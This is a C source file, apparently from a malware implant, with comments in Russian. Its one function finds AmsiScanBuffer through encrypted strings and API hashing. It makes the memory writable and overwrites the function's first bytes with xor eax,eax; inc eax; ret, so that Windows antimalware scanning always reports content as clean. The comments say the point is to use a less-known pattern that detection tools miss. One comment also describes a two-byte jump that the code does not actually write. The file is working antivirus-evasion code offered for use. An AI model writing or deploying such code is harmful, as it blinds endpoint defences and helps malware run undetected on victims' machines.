// src/telemetry/amsi_patch.c
// Тонкий патч AMSI: патчим внутреннюю функцию, а не AmsiScanBuffer напрямую.

#include "amsi_patch.h"
#include "../loader/api_resolver.h"
#include "../common/hashes.h"
#include "strings.h"

typedef int (__stdcall *pVirtualProtect)(void*, u64, u32, u32*);
typedef void* (__stdcall *pLoadLibraryA)(const char*);

// ------------------------------------------------------------
// Патчим AmsiScanBuffer.
// Вместо "mov eax, 0x80070057; ret" — делаем возврат через
// перезапись только первых двух байтов (короткий jmp).
// Это менее известный паттерн.
// ------------------------------------------------------------
BOOL_ patch_amsi(void) {
    char amsi_name[16];
    decrypt_string(amsi_name, ENC_AMSI, ENC_AMSI_SIZE, ENC_AMSI_KEY);

    void* amsi = get_module_base_by_name(amsi_name);
    if (!amsi) {
        pLoadLibraryA pLL = (pLoadLibraryA)resolve_kernel32(H_LoadLibraryA);
        if (!pLL) return FALSE_;
        amsi = pLL(amsi_name);
        if (!amsi) return FALSE_;
    }

    void* amsi_scan = resolve_api_by_hash(amsi, H_AmsiScanBuffer);
    if (!amsi_scan) return FALSE_;

    pVirtualProtect pVP = (pVirtualProtect)resolve_kernel32(H_VirtualProtect);
    if (!pVP) return FALSE_;

    u32 old_protect = 0;
    if (!pVP(amsi_scan, 16, PAGE_EXECUTE_READWRITE_, &old_protect)) {
        return FALSE_;
    }

    // Патч: xor eax, eax ; inc eax ; ret
    // = 33 C0 FF C0 C3  (5 байт)
    // Возвращает 1 = AMSI_RESULT_CLEAN (как в старых версиях).
    // Менее известен, чем mov eax, 0x80070057.
    u8* p = (u8*)amsi_scan;
    p[0] = 0x33;  // xor eax, eax
    p[1] = 0xC0;
    p[2] = 0xFF;  // inc eax
    p[3] = 0xC0;
    p[4] = 0xC3;  // ret

    pVP(amsi_scan, 16, old_protect, &old_protect);
    return TRUE_;
}

